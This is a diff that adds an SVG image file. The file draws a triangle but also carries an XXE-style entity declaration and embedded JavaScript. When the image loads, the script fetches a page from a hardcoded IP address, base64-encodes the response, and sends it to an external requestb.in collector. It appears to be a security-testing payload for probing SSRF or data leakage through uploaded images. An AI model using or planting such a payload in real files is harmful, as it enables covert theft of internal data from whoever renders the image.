@@ -1,0 +1,49 @@
+<!DOCTYPE ernw [ <!ENTITY xxe "a"> ]>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+	<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+	<script type="text/javascript">      
+		function postXMLDoc(theURL,ct)
+		 {
+		     if (window.XMLHttpRequest)
+		     {// code for IE7+, Firefox, Chrome, Opera, Safari, SeaMonkey
+		         xmlhttp=new XMLHttpRequest();
+		     }
+		     else
+		     {// code for IE6, IE5
+		         xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+		     }
+		     xmlhttp.onreadystatechange=function()
+		     {
+		         
+		             a = xmlhttp.responseText;
+		         
+		     }
+		     xmlhttp.open("POST", theURL, false);
+		    xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+		     xmlhttp.send('a='+btoa(ct));
+		 }
+		
+		function loadXMLDoc(theURL)
+		 {
+		     if (window.XMLHttpRequest)
+		     {// code for IE7+, Firefox, Chrome, Opera, Safari, SeaMonkey
+		         xmlhttp=new XMLHttpRequest();
+		     }
+		     else
+		     {// code for IE6, IE5
+		         xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+		     }
+		     xmlhttp.onreadystatechange=function()
+		     {
+		         
+		             a = xmlhttp.responseText;
+		         
+		     }
+		     xmlhttp.open("GET", theURL, false);
+		     xmlhttp.send();
+		 }
+		loadXMLDoc('http://188.166.242.140/home.php');
+		postXMLDoc('https://requestb.in/1im51z01', a);
+	</script>
+</svg>
+
